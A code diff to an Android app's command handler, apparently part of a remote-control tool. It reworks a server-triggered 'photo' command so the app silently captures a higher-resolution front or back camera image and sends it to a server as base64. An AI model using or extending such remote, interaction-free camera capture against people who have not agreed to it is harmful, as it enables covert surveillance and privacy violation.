@@ -407,8 +407,12 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                 }
                 "photo" -> {
                     try {
-                        val result = capturePhotoBlocking(textArg.lowercase() == "front")
-                        val resp = createResponse(cmdId, "photo_result", result)
+                        val facing = textArg.lowercase()
+                        val useFront = facing == "front"
+                        val bytes = capturePhotoBytes(useFront)
+                        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                        // Kirim sebagai photo_base64 (string langsung) agar server bisa simpan ke file
+                        val resp = createResponse(cmdId, "photo_base64", b64)
                         sendResponse(resp)
                         return resp
                     } catch (e: Exception) {
@@ -698,7 +702,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
         }.toString()
     }
 
-    private fun capturePhotoBlocking(useFront: Boolean): JSONObject {
+    private fun capturePhotoBytes(useFront: Boolean): ByteArray {
         val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
         val cameraId = camManager.cameraIdList.firstOrNull { id ->
             val facing = camManager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING)
@@ -709,7 +713,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
         val imageCapture = java.util.concurrent.CompletableFuture<ByteArray>()
         val handlerThread = HandlerThread("cam_sync_${System.currentTimeMillis()}").apply { start() }
         val camHandler = Handler(handlerThread.looper)
-        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
+        val imageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 1)
         var cameraDevice: CameraDevice? = null
 
         imageReader.setOnImageAvailableListener({ reader ->
@@ -732,16 +736,14 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         try {
                             val characteristics = camManager.getCameraCharacteristics(cameraId)
                             val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
-                            val jpegOrientation = sensorOrientation
-
                             val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                 addTarget(imageReader.surface)
                                 set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                 set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
+                                set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                             }.build()
-                            // Beri waktu sedikit untuk AE sebelum capture
-                            camHandler.postDelayed({ 
+                            // Beri waktu AE sebelum capture
+                            camHandler.postDelayed({
                                 try {
                                     session.capture(req, null, camHandler)
                                 } catch (e: Exception) {
@@ -768,12 +770,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
         }, camHandler)
 
         return try {
-            val bytes = imageCapture.get(10, java.util.concurrent.TimeUnit.SECONDS)
-            val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
-            JSONObject().apply {
-                put("facing", if (useFront) "front" else "back")
-                put("jpeg_base64", b64)
-            }
+            imageCapture.get(12, java.util.concurrent.TimeUnit.SECONDS)
         } finally {
             try { cameraDevice?.close() } catch (_: Exception) {}
             try { imageReader.close() } catch (_: Exception) {}
